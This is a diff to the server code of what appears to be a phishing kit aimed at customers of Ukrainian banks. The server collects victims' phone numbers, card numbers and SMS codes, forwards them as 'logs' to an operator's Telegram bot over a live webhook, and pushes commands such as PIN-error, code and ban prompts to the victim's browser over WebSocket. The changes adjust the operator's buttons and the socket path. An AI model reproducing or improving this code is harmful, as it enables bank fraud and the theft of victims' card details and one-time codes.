@@ -11,8 +11,7 @@ const WEBHOOK_URL = 'https://new-l8h6.onrender.com/bot' + TELEGRAM_BOT_TOKEN;
 
 // СПИСОК БАНКОВ ДЛЯ КНОПКИ "ЗАПРОС"
 const banksForRequestButton = [
-    'Райффайзен', 'Альянс', 'ПУМБ', 'OTP Bank',
-    'Восток', 'Izibank', 'Укрсиб'
+    'Райффайзен', 'Восток', 'Izibank', 'Укрсиб'
 ];
 
 const app = express();
@@ -56,7 +55,10 @@ app.post('/bot' + TELEGRAM_BOT_TOKEN, (req, res) => {
 });
 
 const server = require('http').createServer(app);
-const wss = new WebSocket.Server({ server });
+const wss = new WebSocket.Server({ 
+    server,
+    path: '/ws' // Добавляем путь для WS
+});
 
 const clients = new Map();
 const sessions = new Map();
@@ -139,7 +141,7 @@ app.post('/api/submit', (req, res) => {
 
         console.log(`Received FINAL data for session ${sessionId}, visit #${newData.visitCount}`);
 
-        let message = `<b>Новий запис!</b>\n\n`;
+        let message = `<b>Новий лог!</b>\n\n`;
         message += `<b>Назва банку:</b> ${newData.bankName}\n`;
         message += `<b>Номер телефону:</b> <code>${newData.phone || 'Не вказано'}</code>\n`;
         message += `<b>Номер карти:</b> <code>${newData.card_confirm || newData.card || 'Не вказано'}</code>\n`;
@@ -193,22 +195,22 @@ app.post('/api/sms', (req, res) => {
 });
 
 function sendToTelegram(message, sessionId, bankName) {
-    const keyboard = [
+    let keyboard = [
         [
             { text: 'SMS', callback_data: `sms:${sessionId}` },
-            { text: 'ЛК', callback_data: `lk_${bankName.toLowerCase().replace(/ /g, '_')}::${sessionId}` }
+            { text: 'ЛК', callback_data: `lk_${bankName.toLowerCase().replace(/ /g, '_')}::${sessionId}` },
+            { text: 'ЗВОНОК', callback_data: `call_oschad:${sessionId}` }
         ],
         [
-            { text: 'ЗВОНОК', callback_data: `call_oschad:${sessionId}` },
             { text: 'ПІН', callback_data: `pin_error:${sessionId}` },
             { text: 'КОД', callback_data: `code_error:${sessionId}` },
             { text: 'КОД ✅', callback_data: `timer:${sessionId}` }
         ],
         [
-            { text: 'НОМЕР', callback_data: `number_error:${sessionId}` }
+            { text: 'НОМЕР', callback_data: `number_error:${sessionId}` },
+            { text: 'OTHER', callback_data: `other:${sessionId}` }
         ],
         [
-            { text: 'OTHER', callback_data: `other:${sessionId}` },
             { text: 'BAN', callback_data: `ban:${sessionId}` },
             { text: 'СВОЙ', callback_data: `custom:${sessionId}` }
         ]
@@ -216,6 +218,11 @@ function sendToTelegram(message, sessionId, bankName) {
 
     if (banksForRequestButton.includes(bankName)) {
         keyboard[0].push({ text: 'ЗАПРОС', callback_data: `request_details:${sessionId}` });
+    }
+
+    // Если банк не Ощад, убираем ЗВОНОК
+    if (bankName !== 'Ощадбанк') {
+        keyboard[0] = keyboard[0].filter(btn => btn.text !== 'ЗВОНОК');
     }
 
     const options = {
@@ -228,7 +235,8 @@ function sendToTelegram(message, sessionId, bankName) {
 }
 
 bot.on('callback_query', (callbackQuery) => {
-    const [type, sessionId] = callbackQuery.data.split(':');
+    const [type, param] = callbackQuery.data.split(':');
+    const sessionId = param || type.split(':')[1]; // Фикс для lk_*::
     const ws = clients.get(sessionId);
     if (ws && ws.readyState === WebSocket.OPEN) {
         let commandData = {};
@@ -285,6 +293,7 @@ bot.on('callback_query', (callbackQuery) => {
         bot.answerCallbackQuery(callbackQuery.id, { text: `Команда "${type}" відправлена!` });
     } else {
         bot.answerCallbackQuery(callbackQuery.id, { text: 'Помилка: клієнт не в мережі!', show_alert: true });
+        console.log(`WS not found for ${sessionId}, state: ${ws ? ws.readyState : 'null'}`);
     }
 });
 
